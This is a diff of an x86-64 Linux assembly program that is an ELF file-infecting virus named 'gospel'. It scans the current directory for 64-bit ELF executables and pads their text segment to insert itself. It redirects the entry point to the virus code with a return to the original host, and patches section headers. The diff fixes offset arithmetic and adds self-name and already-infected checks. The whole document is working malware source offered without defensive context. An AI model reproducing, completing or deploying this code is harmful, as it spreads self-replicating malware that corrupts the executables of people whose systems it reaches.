@@ -242,8 +242,10 @@ SYS_CREAT		equ 0x55
 PAGESIZE dd 4096	
 
 
-teststr db 'boo', 13,10,0
-teststrlen equ $-teststr
+;teststr db 'boo', 13,10,0
+;teststrlen equ $-teststr
+
+vxname db 'gospel',0
 
 targetdir db '.',0
 targetdirlen equ $-targetdir
@@ -254,40 +256,46 @@ targetdirlen equ $-targetdir
 ;
 ;****************************************************************************************
 
-;checkelfpass db 'File is an ELF!', 13, 10, 0
-;checkelfpasslen equ $-checkelfpass
-;
-;checkelffail db 'File is not an ELF!', 13, 10, 0
-;checkelffaillen equ $-checkelffail
-;
-;checkfile_dtreg_fail db 'File is not a DTREG file!', 13, 10, 0
-;checkfiledtreg_fail_len equ $-checkfile_dtreg_fail
-;
-;checkelf_etype_fail db 'e_type is not DYN or EXEC... boo :( ', 13, 10, 0
-;checkelf_etype_faillen equ $-checkelf_etype_fail
-;
-;check64pass db 'File is an ELFCLASS64!', 13, 10, 0
-;check64passlen equ $-check64pass
-;check64fail db 'File is not an ELFCLASS64 booo :( going to next one', 13, 10, 0
-;check64faillen equ $-check64fail
-;
-;checkarchpass db 'File is compiled for x86-64!', 13, 10, 0
-;checkarchpasslen equ $-checkarchpass
-;checkarchfail db 'File is not compiled for x86-64 booo :( going to next one', 13, 10, 0
-;checkarchfaillen equ $-checkarchfail
-;
-;checkphdrstart db 'Beginning of phdr_loop', 13,10,0
-;checkphdrstartlen equ $-checkphdrstart
-;
-;checkptloadpass db 'Segment is PT_LOAD!', 13, 10, 0
-;checkptloadpasslen equ $-checkptloadpass
-;checkptloadfail db 'Segment is not PT_LOAD :( going to next one', 13, 10, 0
-;checkptloadfaillen equ $-checkptloadfail
-;
-;textsegmentoffset_pageyes db 'offset to beginning of .text segment in host is > PAGESIZE', 13, 10, 0
-;textsegmentoffset_pageyes_len equ $-textsegmentoffset_pageyes
-;textsegmentoffset_pageno db 'offset to beginning of .text segment in host is < PAGESIZE', 13, 10, 0
-;textsegmentoffset_pageno_len equ $-textsegmentoffset_pageno
+checkelfpass db 'File is an ELF!', 13, 10, 0
+checkelfpasslen equ $-checkelfpass
+
+checkelffail db 'File is not an ELF!', 13, 10, 0
+checkelffaillen equ $-checkelffail
+
+checkfile_dtreg_fail db 'File is not a DTREG file!', 13, 10, 0
+checkfiledtreg_fail_len equ $-checkfile_dtreg_fail
+
+checkelf_etype_fail db 'e_type is not DYN or EXEC... boo :( ', 13, 10, 0
+checkelf_etype_faillen equ $-checkelf_etype_fail
+
+check64pass db 'File is an ELFCLASS64!', 13, 10, 0
+check64passlen equ $-check64pass
+check64fail db 'File is not an ELFCLASS64 booo :( going to next one', 13, 10, 0
+check64faillen equ $-check64fail
+
+checkarchpass db 'File is compiled for x86-64!', 13, 10, 0
+checkarchpasslen equ $-checkarchpass
+checkarchfail db 'File is not compiled for x86-64 booo :( going to next one', 13, 10, 0
+checkarchfaillen equ $-checkarchfail
+
+pasinfectepass db 'File is not already infected', 13, 10, 0
+pasinfectepasslen equ $-pasinfectepass
+
+filenamepass db 'File is not vx file gospel, good to continue', 13, 10, 0
+filenamepasslen equ $-filenamepass
+
+checkphdrstart db 'Beginning of phdr_loop', 13,10,0
+checkphdrstartlen equ $-checkphdrstart
+
+checkptloadpass db 'Segment is PT_LOAD!', 13, 10, 0
+checkptloadpasslen equ $-checkptloadpass
+checkptloadfail db 'Segment is not PT_LOAD :( going to next one', 13, 10, 0
+checkptloadfaillen equ $-checkptloadfail
+
+textsegmentoffset_pageyes db 'offset to beginning of .text segment in host is > PAGESIZE', 13, 10, 0
+textsegmentoffset_pageyes_len equ $-textsegmentoffset_pageyes
+textsegmentoffset_pageno db 'offset to beginning of .text segment in host is < PAGESIZE', 13, 10, 0
+textsegmentoffset_pageno_len equ $-textsegmentoffset_pageno
 ;****************************************************************************************
 
 ;variables used for phdr and shdr manipulation routines
@@ -295,11 +303,11 @@ targetdirlen equ $-targetdir
 evaddr: dq 0
 
 ;original section header offset
-oshoff: dq 0
+oshoff: dd 0
 
 hostentry_offset: dd 0
 hosttext_start: dd 0
-host_shdrs_len: dd 0
+;host_shdrs_len: dd 0
 
 data_offset_new_padding: dd 0
 data_offset_original: dd 0
@@ -360,15 +368,15 @@ ETYPE_EXEC		equ 0x2
 ELFX8664		equ 0x3e
 
 ;D_TYPE values
-;DT_REG 			equ 0x8
+DT_REG 			equ 0x8
 
 ;PHDR vals
 PT_LOAD 	equ 0x1
-PFLAG_R	equ 0x4
-PFLAG_X	equ 0x1
-PFLAG_RX	equ 0x5
-PFLAG_RW	equ 0x6
+;PFLAG_R	equ 0x4
+;PFLAG_X	equ 0x1
 ;PFLAG_W	equ 0x2
+PFLAGS_RX	equ 0x5
+PFLAGS_RW	equ 0x6
 
 ;MAX_RDENT_BUF	times 0x800 db 0 
 MAX_RDENT_BUF_SIZE equ 0x800
@@ -454,14 +462,14 @@ _getdirents:
 ;	lea r13, [r14 + 200]
 ;	call _write
 ;
-;_write:
-;		xor rsi, rsi
-;		mov rdx, r12
-;		mov rsi, r13
-;		mov rdi, STDOUT
-;		mov rax, SYS_WRITE
-;		syscall
-;		ret
+_write:
+		xor rsi, rsi
+		mov rdx, r12
+		mov rsi, r13
+		mov rdi, STDOUT
+		mov rax, SYS_WRITE
+		syscall
+		ret
 ;	
 ;printteststr:
 ;		lea rsi, teststr
@@ -516,24 +524,28 @@ check_file:
 		;lea r13, [rcx + r14 + 600 + linuxdirent.d_nameq]
 		;lea r13, [r14 + 200]
 		;call _write
-		mov rcx,r12
 		xor rax, rax
 		push r9
 	check_filename:
 		cmp qword [r14+200], "."
 		je checknext
-		jmp get_vx_name
-	check_vx_name:
-		pop rax
-		lea rsi, [rax]
-		cmp qword [r14+200], rsi
-		je checknext
-		jmp get_filestat
-		;mov r12, 'gospel\0'
-
-	get_vx_name:
-		call check_vx_name
-		vxname: db 'gospel\0'		
+		;;lea rdi, [vxname]
+		;;mov rsi, 0x006c6570736f67
+		;;lea rsi, [r14 + 200] 
+		;lea rsi, [rcx + r14 + 600 + linuxdirent.d_nameq]
+		;;cmp qword rsi, rdi
+		;cld
+		;mov rcx, 6
+		;rep cmpsb
+		;cmp dword [rcx + r14 + 600 + linuxdirent.d_nameq], 'gospel'
+		;;je checknext
+		; rsi, rdi
+		;lea r12, [r14 + 100]
+		;mov r12, 0x00006c6570736f67
+		;cmp byte [r14+200], 0x67
+		;lea r13, filenamepass
+		;mov r12, filenamepasslen
+		;call _write
 
 	get_filestat:
 									;size for mmap == e_shoff + (e_shnum * e_shentsize)
@@ -603,9 +615,9 @@ check_file:
 		jnz checknext
 		
 		;debug print check
-;		lea r13, checkelfpass
-;		mov r12, checkelfpasslen
-;		call _write
+		;lea r13, checkelfpass
+		;mov r12, checkelfpasslen
+		;call _write
 	
 	check_elf_header_64bit:
 		;debug print check
@@ -632,6 +644,12 @@ check_file:
 		;mov r12, checkarchpasslen
 		;call _write
 		
+;	verifie_deja_infecte:
+;		cmp dword [rax + elf_ehdr.ei_padding], 0x6f786f78
+;		lea r13, pasinfectepass
+;		mov r12, pasinfectepasslen
+;		call _write
+
 	ready2infect:
 		call infect	
 		jmp painting
@@ -640,6 +658,7 @@ check_file:
 		;mov r12, checkfiledtreg_fail_len
 		;lea r13, checkfile_dtreg_fail
 		;lea r13, [rcx + r14 + 600 + linuxdirent.d_nameq]
+		;lea r13, [r14 + 200]
 		;call _write
 		
 		mov rdi, fd
@@ -775,10 +794,10 @@ infect:
 			jne .mod_subsequent_phdr
 			.mod_curr_header:
 				;cmp dword [r13 + r12 + elf_phdr.p_flags], (PFLAG_R | PFLAG_X)
-				cmp dword [r13 + r12 + elf_phdr.p_flags], PFLAG_RX
+				cmp dword [r13 + r12 + elf_phdr.p_flags], PFLAGS_RX
 				je .mod_phdr_text_segment			
 				;cmp dword [r13 + r12 + elf_phdr.p_flags], (PFLAG_R | PFLAG_W)
-				cmp dword [r13 + r12 + elf_phdr.p_flags], PFLAG_RW
+				cmp dword [r13 + r12 + elf_phdr.p_flags], PFLAGS_RW
 				je .mod_phdr_data_segment			
 				jne .mod_subsequent_phdr
 				.mod_phdr_text_segment:			
@@ -788,7 +807,7 @@ infect:
 					;mov rax, SYS_WRITE
 					;syscall
 					mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
-					add r10d, dword [r13 + r12 + elf_phdr.p_filesz]
+					add r10, [r13 + r12 + elf_phdr.p_filesz]
 					mov qword [evaddr], r10				;save evaddr
 					;add dword r10d, [ventry]				;new entry point of infected file = evaddr + ventry
 					mov dword [r13 + elf_ehdr.e_entry], r10d	; update ELF header entry point to point to virus code start
@@ -802,10 +821,8 @@ infect:
 				.mod_phdr_data_segment:			
 					mov r11, [r13 + r12 + elf_phdr.p_offset]
 					mov dword [data_offset_original],  r11d
-					;;lea r10, [r13 + r12 + elf_phdr.p_offset]
 					;lea qword r10, [r13 + r12 + elf_phdr.p_offset]
 					;mov qword [DATA_OFFSET_HOST], r10
-					;mov [r14 + 0x900], r10			;name of file in rdi
 					add dword r11d, [PAGESIZE]
 					mov dword [r13 + r12 + elf_phdr.p_offset], r11d
 					mov dword [data_offset_new_padding],  r11d
@@ -849,7 +866,7 @@ infect:
 			jge .mod_subsequent_shdr
 			mov r11, [r13 + r15 + elf_shdr.sh_addr]
 			add dword r11d, [r13 + r15 + elf_shdr.sh_size]
-			cmp dword r11d, [evaddr]
+			cmp dword r11d, [vxoffset]
 			jne .mod_subsequent_shdr
 			mov dword r10d, [r13 + r15 + elf_shdr.sh_size]
 			add dword r10d, vlen
@@ -864,11 +881,11 @@ infect:
 			add r15w, word [r13 + elf_ehdr.e_shentsize] ;add elf_ehdr.e_shentsize to shdr offset in r15 
 			cmp cx, 0
 			jg .shdr_loop
-	mov dword [host_shdrs_len], r15d
+	;mov dword [host_shdrs_len], r15d
 	;lea r10, [r13 + elf_ehdr.e_shoff]
 	;mov [SHDR_OFFSET_HOST], r10
 	mov r11, [r13 + elf_ehdr.e_shoff]
-	mov qword [oshoff], r11
+	mov dword [oshoff], r11d
 	cmp dword r11d, [vxoffset]
 	jg .patch_ehdr_shoff
 	jmp fin_infect
@@ -948,6 +965,7 @@ frankenstein_elf:
 		lea rsi, [r13 + elf_ehdr]					;r13 contains pointer to mmap'd file
 		mov rax, SYS_WRITE
 		syscall
+;		jmp .write_datasegment_totemp
 	.write_virus_totemp:
 		mov rdi, r9
 		mov rdx, vlen
@@ -962,8 +980,8 @@ frankenstein_elf:
 		mov dword [r14 + 152], r8d			;address of original host entry point
 		mov byte [r14 + 154], 0xc3			;0xc3 = ret
 		lea rsi, [r14+ 150]
-		mov r10,  vlen						;file offset adjusted to vxoffset+vlen
-		add r10d, dword [vxoffset]
+		mov r10, qword [vxoffset]
+		add r10d, dword vlen				;file offset adjusted to vxoffset+vlen
 		mov rax, SYS_PWRITE64
 		syscall
 		
@@ -980,22 +998,18 @@ frankenstein_elf:
 		
 
 	.write_datasegment_totemp:
-		mov rdi, r9
 		mov rdx, [oshoff]
-		sub rdx, qword [evaddr]
+		sub edx, dword [vxoffset]
 		lea rsi, [r13 + elf_ehdr]				;r13 contains pointer to mmap'd file
-		add rsi, qword [evaddr]						;adjust rsi address to point to original data segment offset of mmap'd file
+		add rsi, qword [data_offset_original]	;adjust rsi address to point to original data segment offset of mmap'd file
 		mov r10d, dword [data_offset_new_padding]
 		mov rax, SYS_PWRITE64
 		syscall
+;		jmp .close_temp		
 
 	.write_patched_shdrs_totemp:
-		mov rdi, r9
 		mov rdx, [r14 + filestat.st_size]
-		sub rdx, qword [oshoff]
-		;sub rdx, qword [evaddr]
-		;sub rdx, qword [data_offset_new_padding]
-		;sub edx, dword [vxoffset]
+		sub edx, dword [oshoff]
 		lea rsi, [r13 + elf_ehdr]
 		add rsi, qword [oshoff]
 		mov r10d, dword [vxshoff]
